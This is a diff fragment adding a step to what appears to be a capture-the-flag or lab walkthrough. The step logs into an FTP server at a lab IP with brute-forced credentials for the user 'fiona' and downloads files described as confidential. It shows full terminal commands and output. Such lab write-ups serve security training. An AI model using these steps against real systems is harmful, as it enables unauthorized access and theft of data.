@@ -258,3 +258,43 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-15 23:19:
 
 ```
 
+step 4 We will now use ftp for getting some juicy info and login via founded credentials above, while searching we found 2 txt files which contains web info and some confidential docs as well.
+```bash
+┌──(root㉿kali)-[~]
+└─# ftp 10.129.111.81
+Connected to 10.129.111.81.
+220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+Name (10.129.111.81:arjun): fiona
+331 password required for fiona
+Password: 
+230-Logged on
+230 
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||40685|)
+ftp: Can't connect to `10.129.111.81:40685': Connection timed out
+200 PORT command successful
+150 Opening ASCII mode data connection
+-r-xr-xrwx   1 owner    group              55 Apr 21  2022      docs.txt
+-r-xr-xrwx   1 owner    group             255 Apr 22  2022      WebServersInfo.txt
+226 Transfer Complete
+ftp> get docs.txt
+local: docs.txt remote: docs.txt
+200 PORT command successful
+150 RETR command started
+    55        0.16 KiB/s 
+226 Transfer Complete
+55 bytes received in 00:00 (0.16 KiB/s)
+ftp> get WebServersInfo.txt
+local: WebServersInfo.txt remote: WebServersInfo.txt
+200 PORT command successful
+150 RETR command started
+   255        0.94 KiB/s 
+226 Transfer Complete
+255 bytes received in 00:00 (0.94 KiB/s)
+ftp> exit
+221-
+221 Goodbye
+```
+
